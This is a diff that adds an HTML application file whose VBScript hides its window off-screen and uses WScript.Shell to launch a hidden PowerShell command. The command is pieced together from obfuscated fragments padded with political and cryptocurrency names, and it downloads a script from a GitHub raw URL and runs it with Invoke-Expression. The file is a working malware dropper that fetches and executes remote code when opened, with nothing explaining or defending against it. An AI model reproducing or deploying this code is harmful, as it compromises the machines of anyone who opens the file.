@@ -1,0 +1,40 @@
+<HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -3000,-3000
+Dim FBI
+Set FBI= CreateObject("WScript.S"&"HELL")
+Donal=chr(80) &"O" & Chr(87)
+Trump = Chr(69)
+mike = Chr(82) & "s"&"H" & Chr(69)
+pompeo = Chr(76)
+Elon =Chr(76)&" $TRUMP ='https://raw.githubusercontent.com/redxhawk/test/main/All.txt';$"
+WHO = "B ='E"
+ERO = "TH COINt.WTF COINlIOSNT'.Re"
+AA = "place('ETH COIN','nE').Repl"
+BB = "ace('TF COIN','EbC').Rep"
+CC = "lace('OS','e');"
+MUSK = "$CC = 'DOS COIN L"&"SOSCOINnG'.Rep"
+DD = "lace('S COIN ','Wn').Repl"
+FF = "ace('SO','oaD').Rep"
+GG = "lace('COIN','TrI');"
+SHIB =""
+INU ="$A ='I`Eos COIN`W`BTC COINj`ETH COIN $B).$CC($TRUMP)'.Rep"
+KK = "lace('os COIN','X(n`e').Repl"
+TT = "ace('BTC COIN','-Ob').Rep"
+ENB = "lace('TH COIN','`c`T');"
+PUMP ="&('I'+'E"
+OS = "X')($A -J"
+SOS = "oin '')|&('I'+'E"
+EOS = "X');"
+COIN = Donal+Trump++mike+pompeo+Elon+WHO+ERO+AA+BB+CC+MUSK+DD+FF+GG+SHIB+INU+KK+TT+ENB+PUMP+OS+SOS+EOS+""
+FBI.Run COIN,0
+self.close
+</script>
+<body>
+HBAR
+</body>
+</HEAD>
+</HTML>
